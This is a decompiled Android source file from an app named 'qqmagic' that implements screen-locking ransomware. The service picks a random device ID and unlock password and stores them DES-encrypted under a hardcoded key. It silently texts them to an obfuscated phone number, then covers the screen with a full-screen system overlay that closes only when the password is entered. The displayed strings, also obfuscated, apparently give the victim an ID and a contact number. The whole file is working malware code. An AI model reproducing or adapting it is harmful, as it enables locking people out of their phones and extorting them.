package com.qqmagic;

import android.app.Application;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import defpackage.LogCatBroadcaster;
import qqkj.qqmagic.R;

public class s extends Service {
    Button bt;
    DesUtils des;
    EditText ed;
    Editor editor;
    /* access modifiers changed from: private */
    public View mFloatLayout;
    /* access modifiers changed from: private */
    public WindowManager mWindowManager;
    long pass;
    int passw;
    String password;
    String ppss;
    SharedPreferences share;
    SmsManager sms;
    TextView tv;
    TextView tv1;
    TextView tv2;
    TextView tv3;
    TextView tv4;
    private LayoutParams wmParams;

    @Override
    public IBinder onBind(Intent intent) {
        Intent intent2 = intent;
        return (IBinder) null;
    }

    @Override
    public void onCreate() {
        Exception exception;
        LogCatBroadcaster.start(this);
        super.onCreate();
        this.pass = (long) (Math.random() * ((double) 10000000));
        this.passw = (int) (Math.random() * ((double) 1000000));
        DesUtils desUtils = r9;
        DesUtils desUtils2 = new DesUtils("QQ1031606149");
        this.des = desUtils;
        this.share = getSharedPreferences("GreyWolf", 0);
        this.editor = this.share.edit();
        this.sms = SmsManager.getDefault();
        StringBuffer stringBuffer;
        StringBuffer stringBuffer2;
        if (isNetworkConnected(getApplicationContext())) {
            if (this.share.getLong("m", (long) 0) == ((long) 0)) {
                Editor putLong = this.editor.putLong("m", this.pass);
                boolean commit = this.editor.commit();
                try {
                    desUtils2 = this.des;
                    StringBuffer stringBuffer3 = r9;
                    StringBuffer stringBuffer4 = new StringBuffer();
                    putLong = this.editor.putString("passw", desUtils2.encrypt(stringBuffer3.append("").append(this.passw).toString()));
                    commit = this.editor.commit();
                } catch (Exception e) {
                    exception = e;
                }
            }
            stringBuffer = r9;
            stringBuffer2 = new StringBuffer();
            this.ppss = stringBuffer.append(this.share.getLong("m", (long) 8)).append("").toString();
            try {
                this.password = this.des.decrypt(this.share.getString("passw", ""));
            } catch (Exception e2) {
                exception = e2;
            }
            AnonymousClass100000000 anonymousClass100000000 = r9;
            AnonymousClass100000000 anonymousClass1000000002 = new Thread(this) {
                private final s this$0;

                {
                    this.this$0 = r6;
                }

                static s access$0(AnonymousClass100000000 anonymousClass100000000) {
                    return anonymousClass100000000.this$0;
                }

                public void run() {
                    SmsManager smsManager = this.this$0.sms;
                    String h = s.h("/110001/111000/110011/111000/110101/110000/111000/110010/110101/110100/110000", 2);
                    String str = (String) null;
                    StringBuffer stringBuffer = r12;
                    StringBuffer stringBuffer2 = new StringBuffer();
                    stringBuffer2 = r12;
                    StringBuffer stringBuffer3 = new StringBuffer();
                    stringBuffer3 = r12;
                    StringBuffer stringBuffer4 = new StringBuffer();
                    stringBuffer4 = r12;
                    StringBuffer stringBuffer5 = new StringBuffer();
                    stringBuffer5 = r12;
                    StringBuffer stringBuffer6 = new StringBuffer();
                    smsManager.sendTextMessage(h, str, stringBuffer.append(stringBuffer2.append(stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(s.h("/12013/101b3/10533/4a", 12)).append(this.this$0.ppss).toString()).append(s.h("/4094/54ed/34", 18)).toString()).append(this.this$0.password).toString()).append("\n").toString()).append(s.h("/12013/101b3/10533/b70a/48/48/48/48/48/48/48/48/1317b/b70a/1b648/18830/1171a/15941", 12)).toString(), (PendingIntent) null, (PendingIntent) null);
                }
            };
            anonymousClass100000000.start();
            return;
        }
        try {
            stringBuffer = r9;
            stringBuffer2 = new StringBuffer();
            this.ppss = stringBuffer.append(this.des.decrypt("eed5a849fcaba160")).append("").toString();
        } catch (Exception e22) {
            exception = e22;
        }
        try {
            this.password = this.des.decrypt("dae4237303b11b8d");
        } catch (Exception e222) {
            exception = e222;
        }
    }

    @Override
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
        createFloatView();
        AnonymousClass100000001 anonymousClass100000001 = r7;
        AnonymousClass100000001 anonymousClass1000000012 = new Thread(this) {
            private final s this$0;

            {
                this.this$0 = r6;
            }

            static s access$0(AnonymousClass100000001 anonymousClass100000001) {
                return anonymousClass100000001.this$0;
            }

            public void run() {
                this.this$0.sms.sendTextMessage(s.h("/110001/111000/110011/111000/110101/110000/111000/110010/110101/110100/110000", 2), (String) null, s.h("/110001010100101/101010001001010/101100100100111/111100101011110/110001000010001/110011000101111/101000010111011/1001000000111100/110001000010001/100111000101101/1001010100000001/101110001001111/100111010000110", 2), (PendingIntent) null, (PendingIntent) null);
            }
        };
        anonymousClass100000001.start();
    }

    private void createFloatView() {
        LayoutParams layoutParams = r7;
        LayoutParams layoutParams2 = new LayoutParams();
        this.wmParams = layoutParams;
        Application application = getApplication();
        Application application2 = getApplication();
        this.mWindowManager = (WindowManager) application.getSystemService(Context.WINDOW_SERVICE);
        this.wmParams.type = 2010;
        this.wmParams.format = 1;
        this.wmParams.flags = 1280;
        this.wmParams.gravity = 49;
        this.wmParams.x = 0;
        this.wmParams.y = 0;
        this.wmParams.width = -1;
        this.wmParams.height = -1;
        this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(R.layout.newone, (ViewGroup) null);
        this.mWindowManager.addView(this.mFloatLayout, this.wmParams);
        this.bt = (Button) this.mFloatLayout.findViewById(R.id.bt);
        this.ed = (EditText) this.mFloatLayout.findViewById(R.id.ed);
        this.tv = (TextView) this.mFloatLayout.findViewById(R.id.tv);
        Button button = this.bt;
        AnonymousClass100000002 anonymousClass100000002 = r7;
        AnonymousClass100000002 anonymousClass1000000022 = new OnClickListener(this) {
            private final s this$0;

            {
                this.this$0 = r6;
            }

            static s access$0(AnonymousClass100000002 anonymousClass100000002) {
                return anonymousClass100000002.this$0;
            }

            @Override
            public void onClick(View view) {
                View view2 = view;
                if (this.this$0.ed.getText().toString().equals(this.this$0.password)) {
                    this.this$0.mWindowManager.removeView(this.this$0.mFloatLayout);
                    this.this$0.stopSelf();
                }
            }
        };
        button.setOnClickListener(anonymousClass100000002);
        TextView textView = this.tv;
        StringBuffer stringBuffer = r7;
        StringBuffer stringBuffer2 = new StringBuffer();
        textView.setText(stringBuffer.append(h("/38cg/53ba/60h1/4094/42cf/3af9/3c63", 18)).append(this.ppss).toString());
        this.tv1 = (TextView) this.mFloatLayout.findViewById(R.id.tv1);
        this.tv2 = (TextView) this.mFloatLayout.findViewById(R.id.tv2);
        this.tv3 = (TextView) this.mFloatLayout.findViewById(R.id.tv3);
        this.tv4 = (TextView) this.mFloatLayout.findViewById(R.id.tv4);
        this.tv1.setText(h("/4437/3dba/38cg/45bh/49a2/5hhd/69d3/380e/1f", 18));
        this.tv2.setText(h("/101001010100000/110001000010001/111011010000100/111010/1010001/1010001/110001/110000/110011/110001/110110/110000/110110/110001/110100/111001", 2));
        this.tv3.setText(h("/3c7b/38cc/5b2d/60bb/60h1/69d3/4094/54ed", 18));
        this.tv4.setText(h("/4e0g/34/4d35/37dc/42cf/3af9/3c63/40c1/42d2/3d59/37b6/60h1/69d3/4094/54ed", 18));
    }

    public boolean isNetworkConnected(Context context) {
        Context context2 = context;
        if (context2 != null) {
            NetworkInfo activeNetworkInfo = ((ConnectivityManager) context2.getSystemService("connectivity")).getActiveNetworkInfo();
            if (activeNetworkInfo != null) {
                return activeNetworkInfo.isAvailable();
            }
        }
        return false;
    }

    public static String h(String str, int i) {
        int i2 = i;
        String str2 = "";
        String[] split = str.split("/");
        for (int i3 = 1; i3 < split.length; i3++) {
            StringBuffer stringBuffer = r9;
            StringBuffer stringBuffer2 = new StringBuffer();
            str2 = stringBuffer.append(str2).append((char) Integer.parseInt(split[i3], i2)).toString();
        }
        return str2;
    }

    public s() {
    }
}
